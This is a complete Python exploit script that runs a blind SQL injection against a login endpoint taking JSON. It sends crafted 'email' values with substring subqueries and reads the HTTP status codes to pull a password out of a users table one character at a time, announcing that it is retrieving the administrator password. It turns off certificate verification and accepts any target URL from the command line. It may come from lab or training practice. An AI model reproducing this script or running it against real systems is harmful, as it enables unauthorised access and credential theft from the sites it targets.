import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sql_injection(s,url):
    password = ""
    for i in range(1,33):
        for j in range (48,123):
            sqli_payload = f"notrealemail@test.test' OR (SELECT substr(password,{i},1) FROM users ORDER BY rowid LIMIT 1 OFFSET 22) = '{chr(j)}' --"
            data ={"email":sqli_payload,"password":"dfg"}
            response = s.post(url,verify = False, json=data)
            if response.status_code == 200:
                print(f"Found character: {chr(j)} at position {i}")
                password += chr(j)
                break
    print(f"Password found: {password}")
               
def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    s = requests.Session()    
    url = sys.argv[1]
    print("(+) Retreiving administrator password...")
    sql_injection(s,url)  

if __name__ == "__main__":
    main()